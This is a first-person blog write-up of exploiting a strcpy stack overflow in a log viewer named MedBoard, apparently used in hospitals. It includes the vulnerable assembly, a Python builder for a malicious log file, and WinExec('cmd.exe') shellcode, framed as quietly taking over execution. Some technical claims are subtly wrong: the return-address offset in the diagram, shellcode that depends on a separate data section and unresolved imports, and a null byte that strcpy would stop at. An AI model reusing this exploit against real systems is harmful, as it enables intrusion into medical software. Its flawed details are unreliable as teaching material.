---
title: "Overflow in Silence: Stack Smash in MedBoard Log Viewer (x64)"
description: "A vulnerable logging buffer, a careless strcpy, and how I turned a medical app into my shell trigger."
date: '2025-04-20'
categories: ["Reverse Engineering Diaries"]
tags: ["Stack Overflow", "Shellcode", "x64", "Reverse Engineering", "Buffer Exploitation"]
header:
  image: "/images/medboard-strcpy-overflow.jpg"
---

# **Prologue — The Calm Before the Buffer Break**

I wasn't looking for trouble. Just bouncing between binaries on a slow weekend, half-interested in what outdated software still lingers in hospital networks. That’s when I stumbled on **MedBoard Log Viewer** — a quiet little utility meant to process and display logs in a fancy UI. But it was the backend log-loading routine that caught my eye. And once I spotted `strcpy`, I leaned forward.

I knew what I was looking at.

---

## **The Vulnerable Snippet — strcpy’s Reckless Dance**

Here’s the core of what made this program vulnerable:

```asm
lea     rdi, [rbp-400h]        ; local buffer (1024 bytes)
mov     rsi, [rbp+arg_0]       ; source string (external log input)
call    strcpy                 ; unsafe copy
```

No bounds. No checks. Just pure, unsafe copying from an external string into a 1KB buffer sitting on the stack.

It was an open invitation to overwrite the stack frame—including the return address.

---

## **Reverse Engineering Context — Stack Layout in Focus**

Let’s visualize the vulnerable function’s stack layout during runtime:

```text
rbp-400h ---------------------------> [ Local buffer (1024 bytes) ]
...
rbp-8   ---------------------------> [ Saved RBP ]
rbp     ---------------------------> [ Return address (to be overwritten) ]
```

By sending more than 0x400 bytes as log input, I could overflow the buffer. With 0x408 bytes, I reached the return address. And anything beyond that? I owned the instruction pointer.

---

## **Payload Design — Shellcode in the Shadows**

I wasn’t looking to crash the app. I wanted something clean. My plan? Use a simple payload to pop `cmd.exe`. Just a quiet proof-of-concept.

```asm
mov     rcx, offset cmd_str
call    WinExec

cmd_str db "cmd.exe", 0
```

It’s small, it’s silent, and it proves one thing: I’ve taken over execution flow.

---

## **Attack Flow — How the Exploit Went Down**

1. **User uploads crafted log file** → payload-laced input
2. **strcpy copies it blindly** → overflows buffer
3. **Saved return pointer overwritten** → points to our shellcode
4. **Function returns** → jumps to shellcode
5. **`WinExec("cmd.exe")` is triggered** → command prompt opens

The whole chain happened quietly, elegantly. No popups. No errors. Just control.

---

## **Payload Construction — Python Craft**

```python
payload  = b"A" * 0x408          # Padding to reach return address
payload += b"\x90" * 16         # NOP sled
payload += b"\x48\xB9..."      # Shellcode: WinExec("cmd.exe")

with open("pwnlog.txt", "wb") as f:
    f.write(payload)
```

Once this file was imported into the MedBoard app, my shellcode ran under its process space.

---

## **Extra Section — Shellcode Detail**

Here’s a breakdown of how the shellcode works internally:

```asm
section .text
global _start

_start:
    mov     rcx, message        ; RCX = pointer to "cmd.exe"
    call    WinExec             ; call WinExec("cmd.exe")
    ret

section .data
message db "cmd.exe", 0
```

The string is embedded within the payload. The call to `WinExec` happens from within the current process context—no need to resolve dynamically at runtime.

---

## **Post Exploit Thoughts — It’s Still 2003 Somewhere**

Honestly, I wasn’t expecting to see this kind of bug in 2025. But here we are—an application that’s probably still being used to archive hospital logs using code that belongs in the early 2000s.

From my seat, it’s just fascinating how many of these things keep popping up. A buffer on the stack, a call to `strcpy`, no bounds check—it's like riding a bike. You never forget how to pop shells with these.

---

## **Lessons Burned into Stack Frames**

- `strcpy` should have died in the 90s. If you’re still using it, you’re asking for this.
- Always check buffer sizes—especially with local buffers and user input.
- Stack overflows are still alive and kicking in native Windows binaries.
- Static reverse engineering reveals more than fuzzing sometimes—especially for deep stack-based bugs.

---

## **Final Words**

I didn’t break anything. Didn’t crash it. Didn’t go loud.

I just slipped in a log file that happened to carry a little bit more than logs.

And MedBoard? It ran it like it was meant to be there.
